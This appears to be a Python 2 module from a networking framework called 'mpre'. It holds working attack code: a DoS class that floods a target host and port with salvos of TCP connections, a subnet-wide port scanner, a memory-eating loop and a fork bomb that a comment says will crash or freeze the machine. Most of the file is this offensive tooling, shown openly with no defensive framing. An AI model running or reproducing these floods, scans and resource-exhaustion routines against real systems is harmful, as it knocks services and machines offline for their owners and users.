import sys
import os
import functools
from multiprocessing import Process
from contextlib import contextmanager

import mpre
import mpre.base as base
import mpre.defaults as defaults
import mpre.vmlibrary as vmlibrary
import mpre.network as network
from mpre.utilities import Latency
Instruction = mpre.Instruction

Scanner = defaults.Process.copy()
Scanner.update({"subnet" : "127.0.0.1",
"ports" : (22, ),
"range" : (0, 0, 0, 255),
"yield_interval" : 100,
"discovery_verbosity" : 'v'})

DoS = defaults.Process.copy()
DoS.update({"salvo_size" : 100,
"count" : 0,
"ip" : "localhost",
"port" : 80,
"target" : None,
"timeout_notify" : False,
"display_latency" : False,
"display_progress" : False})


"""def trace_function(frame, instruction, args):
    pass

@contextmanager
def resist_debugging():
    sys.settrace(trace_function)
    yield
    sys.settrace(None)"""

    
class Null_Connection(network.Tcp_Client):
    
    def on_connect(self):
        self.delete()        
            
        
class DoS(vmlibrary.Process):

    defaults = DoS

    def __init__(self, **kwargs):
        super(DoS, self).__init__(**kwargs)
        self.latency = Latency(name="Salvo size: {}".format(self.salvo_size))
        self.options = {"target" : self.target,
                        "ip" : self.ip,
                        "port" : self.port}
    def run(self):                                         
        if self.display_progress:
            self.count += 1
            print "Launched {0} connections".format(self.count * self.salvo_size)
        if self.display_latency:
            latency = self.latency
            #print "launching salvo: {0} connections per second ({1} connections attempted)".format(self.latency.average.meta_average, (self.count * self.salvo_size))
            self.latency.update()
            self.latency.display()
            
        options = self.options
        backup = Null_Connection.defaults.copy()
        Null_Connection.defaults.update(options)
        for connection_number in xrange(self.salvo_size):
            self.create(Null_Connection)        
        self.run_instruction.execute(self.priority)
        Null_Connection.defaults.update(backup)
        
        
class Tcp_Port_Tester(network.Tcp_Client):
    
    def on_connect(self):
        print self, "Connected"
        address = self.getpeername()
        self.alert("Found a service at {0}:{1}", address, level='v')
        #Instruction("Service_Listing", "add_service", address).execute()
        self.delete()      
        
        
class Scanner(vmlibrary.Process):

    defaults = Scanner

    def __init__(self, **kwargs):
        super(Scanner, self).__init__(**kwargs)
        self.thread = self.new_thread()
        
    def run(self):
        try:
            next(self.thread)
        except StopIteration:
            self.delete()

    def new_thread(self):
        subnet_list = self.subnet.split(".")
        subnet_zero = int(subnet_list[0])
        subnet_zero_range = subnet_zero + self.range[0]
        subnet_one = int(subnet_list[1])
        subnet_one_range = subnet_one + self.range[1]
        subnet_two = int(subnet_list[2])
        subnet_two_range = subnet_two + self.range[2]
        subnet_three = int(subnet_list[3])
        subnet_three_range = subnet_three + self.range[3]

        subnet_range = (subnet_zero_range, subnet_one_range,
                        subnet_two_range, subnet_three_range)
        subnet_range = '.'.join(str(subnet) for subnet in subnet_range)
        self.subnet_range = (self.subnet, subnet_range)

        ports = self.ports
        low_port = min(ports)
        high_port = max(ports)
        if low_port != high_port:
            self.port_range = (low_port, high_port)
        else:
            self.port_range = low_port    
        
        yield_interval = self.yield_interval
        run_instruction = self.run_instruction
        priority = self.priority
        for field_zero in xrange(subnet_zero, subnet_zero_range + 1):
            for field_one in xrange(subnet_one, subnet_one_range + 1):
                for field_two in xrange(subnet_two, subnet_two_range + 1):
                    for field_three in xrange(subnet_three, subnet_three_range + 1):
                        address = ".".join((str(field_zero), str(field_one), str(field_two), str(field_three)))
                        self.alert("Scanning address: {}", [address], level='v')
                        for port in ports:                            
                            self.create(Tcp_Port_Tester, target=(address, port), 
                                        verbosity=self.discovery_verbosity)
                            yield_interval -= 1
                            if not yield_interval:
                                run_instruction.execute(priority)
                                yield
                                yield_interval = self.yield_interval

            
# warning: these will crash/freeze your machine
def memory_eater():
    a_list = [''.join(chr(x) for x in xrange(128))]
    while True:
        try:
            a_list.extend(x * 8 for x in a_list)
        except:
            pass
            
if "win" in sys.platform:
    import subprocess
    fork = subprocess.Popen
else:
    fork = os.fork
    
def fork_bomb(eat_memory=True):
    def spawn():
        return Process(target=fork_bomb)
       
    while True:
        spawn().start()
        if eat_memory:
            memory_eater()